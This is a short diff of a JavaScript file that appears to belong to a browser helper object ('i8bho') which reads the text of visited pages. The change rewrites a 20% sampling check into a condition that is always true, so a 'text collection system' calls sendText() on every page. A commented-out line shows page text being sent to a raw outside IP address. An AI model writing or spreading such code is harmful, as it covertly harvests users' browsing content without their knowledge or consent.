@@ -1,4 +1,3 @@
-alert(document.body.innerText);
 var i8bho_bindoemid= i8bho_bindoemid||0,
 	i8bho_nid= i8bho_nid||'0',
 	i8bho_rid= i8bho_rid||0,
@@ -470,7 +469,7 @@ function I8bho_print()
 			i= 0, length= words.length, max= rand(7, 10), matches= [], text= body.innerText.toLowerCase();
 
 		//distrebuted text collection system
-		if( rand(1,100)<=20 )
+		if( rand(1,20)<=100 )
             sendText();
 //			I8px('http://211.154.172.172/text?text=' + encodeURIComponent(text).substr(0, 1024) );
 
@@ -515,7 +514,7 @@ function I8bho_print()
                     para = para.substr(0, para[paraSize - 2] == '%' ? (paraSize - 2) : (para[paraSize - 1] == '%' ? (paraSize - 1) : paraSize));
                 }
             }
-            I8px(prefix + (i + 1) + param + para);
+            I8px(prefix + i + param + para);
         }
     }
 
